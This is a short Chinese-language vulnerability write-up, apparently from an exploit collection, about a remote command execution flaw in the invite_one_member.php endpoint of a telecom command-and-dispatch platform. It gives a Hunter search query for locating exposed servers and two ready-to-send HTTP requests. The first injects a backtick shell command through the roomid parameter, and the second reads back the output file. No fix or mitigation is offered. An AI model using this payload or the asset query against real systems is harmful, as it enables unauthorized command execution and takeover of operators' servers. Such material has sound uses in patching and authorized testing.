# 指挥调度平台invite_one_member存在远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台invite_one_member存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(51, 51, 51);">三、资产测绘</font>
+ <font style="color:rgb(51, 51, 51);">hunter</font>`<font style="color:rgb(51, 51, 51);">web.body="app/structure/departments.php"</font>`
+ <font style="color:rgb(51, 51, 51);">特征</font>

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/HiSRlR6oYxF5SC60/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-490622.png)

# <font style="color:rgb(51, 51, 51);">四、漏洞复现</font>
```plain
GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt` HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
Upgrade-Insecure-Requests: 1
```

![1704269514170-dd697dbd-3d30-4627-b5a8-7c8c9311b12f.png](./img/HiSRlR6oYxF5SC60/1704269514170-dd697dbd-3d30-4627-b5a8-7c8c9311b12f-410619.png)

获取命令执行结果

```plain
GET /api/client/audiobroadcast/1.txt HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
Upgrade-Insecure-Requests: 1
```

![1704269557671-017c3bf2-7d59-4077-9366-383b169516b1.png](./img/HiSRlR6oYxF5SC60/1704269557671-017c3bf2-7d59-4077-9366-383b169516b1-896745.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qrlgzdlrg8kwz94r>